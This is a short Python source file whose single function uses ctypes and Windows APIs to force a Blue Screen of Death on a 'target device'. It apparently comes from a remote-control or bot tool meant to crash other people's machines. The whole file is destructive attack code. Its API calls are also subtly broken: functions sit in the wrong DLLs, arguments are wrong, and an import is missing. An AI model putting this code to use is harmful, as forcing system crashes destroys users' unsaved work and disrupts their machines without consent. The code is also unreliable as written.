import ctypes

def bluescreen() -> str:
    """
    Triggers a Blue Screen of Death (BSOD) on the target device.
    
    Returns:
        str: A message indicating success or failure.
    """
    try:
        # Adjust privilege to SE_SHUTDOWN_NAME
        privilege = ctypes.windll.advapi32.LookupPrivilegeValue(None, "SeShutdownPrivilege")
        token = ctypes.windll.advapi32.OpenProcess(0x1000000, False, -1)  # Use -1 for the current process
        ctypes.windll.advapi32.LookupPrivilegeValue(None, "SeShutdownPrivilege")
        ctypes.windll.advapi32.AdjustTokenPrivileges(token, 0, 1, privilege, 0, 0, 0, 0, 0)
        ctypes.windll.ntdll.RtlAdjustPrivilege(privilege, 1, 0, ctypes.byref(ctypes.c_byte()), 0, 0, 0, 0, 0)
        
        # Trigger BSOD
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
        
        return "❌ BSOD triggered successfully."
    except Exception as e:
        return f"❌ Failed to trigger BSOD. Error: {e}"
